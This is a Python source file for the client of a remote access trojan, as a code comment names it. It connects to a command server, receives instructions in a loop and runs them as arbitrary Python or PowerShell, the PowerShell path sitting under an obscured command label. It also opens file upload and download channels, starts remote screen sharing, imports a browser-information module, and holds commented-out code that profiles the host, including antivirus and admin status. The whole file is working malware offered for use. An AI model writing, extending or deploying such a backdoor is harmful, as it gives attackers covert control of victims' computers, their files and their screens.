from modules.filedownload import FileDownload
from modules.fileupload import FileTransfer
from modules.screenshare import ScreenShare
import os
import platform
import ctypes
import psutil
import getpass
import json
import subprocess
import winreg as _winreg
import socket
import time
from threading import Thread
from multiprocessing import Process

from modules.terminal.terminal import *
from modules.browser_information import handle_browser_information
from communication.socket_client import SocketClient

# Initialize Windows DLLs
user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

# Windows constants
HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

# Define CLIENT class
class CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.command_history = []

        self.socketClient = SocketClient(host, port)
        if (self.socketClient.connected == False):
            print("Error connecting to server")
            return
        
        if (self.socketClient.connected == True):
            print("Connected to server")

            self.screenshareClient = ScreenShare()

            # Initialize file upload manager
            self.file_upload_manager = FileTransfer("localhost", 4440)

            # Start file upload thread
            self.file_transfer_thread = Thread(
                target=self.file_upload_manager.connect)
            self.file_transfer_thread.start()

            # Initialize file download manager
            self.file_download_manager = FileDownload("localhost", 4441)

            # Start file download thread
            self.file_download_thread = Thread(
                target=self.file_download_manager.connect)
            self.file_download_thread.start()

            self.terminal = Terminal()

            self.execute()

    # Function to gather system information
    # def gather_info(self):
        

        

    #     optional_info = {
    #         "Microsoft Defender": "Enabled",
    #         "Antivirus": "AVG",
    #         "Firewall": "Enabled",
    #         "Uptime": str(round((psutil.boot_time() - psutil.boot_time()) / 3600, 2)) + " hours",
    #         "Idle Time": str(round((psutil.cpu_times().idle) / 3600, 2)) + " hours",
    #         "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
    #         "Bit": platform.architecture()[0],
    #         "SafeLink Version": "1.0",
    #         "ComputerID": "123456",
    #         "Current Directory": os.getcwd(),
    #     }

    #     # get browser info
    #     # get all browsers installed on the system
    #     #browsers = handle_browser_information()

    #     client_info = {
    #         "System Info": system_info,
    #         "Optional Info": optional_info,
    #         #"Browsers": browsers,
    #         "Computer Hardware": {
    #             "CPU": "Intel Core i7",
    #             "GPU": "NVIDIA GeForce RTX 3080",
    #             "RAM": "32 GB",
    #             "Motherboard": "ASUS ROG Strix Z590",
    #             "Storage": {
    #                 "Total": "1 TB SSD",
    #                 "Free": "500 GB"
    #             },
    #             "Audio": "Realtek HD Audio",
    #             "USB Devices": [
    #                 "USB Mouse",
    #                 "USB Keyboard",
    #                 "USB Flash Drive"
    #             ]
    #         },
    #         "Network Info": {
    #             "Network Adapter": {
    #                 "Name": "Ethernet",
    #                 "Status": "Connected",
    #                 "Speed": "1 Gbps",
    #                 "Type": "Wired"
    #             },
    #             "Network Speed": "100 Mbps",
    #             "Network Type": "Wi-Fi",
    #             "Network Status": "Connected",
    #             "Network Usage": {
    #                 "Upload": "1.2 MB/s",
    #                 "Download": "5.3 MB/s"
    #             },
    #             "Network Connections": [
    #                 {
    #                     "IP": "192.168.1.2",
    #                     "Port": 80,
    #                     "Protocol": "HTTP"
    #                 },
    #             ]
    #         }
    #     }
    #     return json.dumps(client_info)

    def execute(self):
        while True:
            command = self.socketClient.receive_output()
            try:
                command = command.split("|", 1)
                command_type = command[0].split("command_type")[
                    1].replace(":", "")
                command_cmd = command[1].split("command")[1].replace(":", "")

                if command_type == "function":
                    output = self.handle_function(command_cmd)
                elif command_type == "python":
                    output = subprocess.check_output(
                        ["python", "-c", command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()
                elif command_type == "asodkok":
                    # Execute PowerShell command
                    process = subprocess.Popen(
                        ["powershell.exe", "-Command", command_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,  # Open a pipe for input
                        shell=True,
                        text=True
                    )
                    # Send a newline to handle input prompts
                    out, err = process.communicate(input="\n")
                    if process.returncode == 0:
                        result = out.strip()
                        error = None
                    else:
                        result = None
                        error = err.strip()
                        if not result and error:
                            # Handle the case where there is an error message but no result
                            result = error.strip()
                    output = {
                        "result": result,
                        "error": error
                    }
                else:
                    print("Yes, running there...")

                    power_shell = PowerShell()
                    self.terminal.add_language(power_shell)
                    result = self.terminal.execute(
                        "PowerShell", command_cmd)
                    output = result

            except Exception as e:
                print("Error executing command:", str(e))
                output = {
                    "result": None,
                    "error": str(e)
                }
            print(output)
            # Send the output as a JSON string
            self.socketClient.send_command(output)

    # Function to handle specific functions sent by the RAT server
    def handle_function(self, function_name):
        if function_name == "screen_share":
            # Use the self.screenshareClient object to start the screenshare but in a separate process
            self.screen_share_process = Process(
                target=self.screenshareClient.start_screenshare)
            self.screen_share_process.start()
            return "Screen share started successfully at port 8080"
        elif function_name == "stop_screen_share":
            # Stop the screenshare
            self.screenshareClient.stop_screenshare()
            # Terminate the process
            self.screen_share_process.terminate()
            return "Screen share stopped successfully"


if __name__ == '__main__':
    rat = CLIENT('localhost', 4444)
    print("Exiting...")
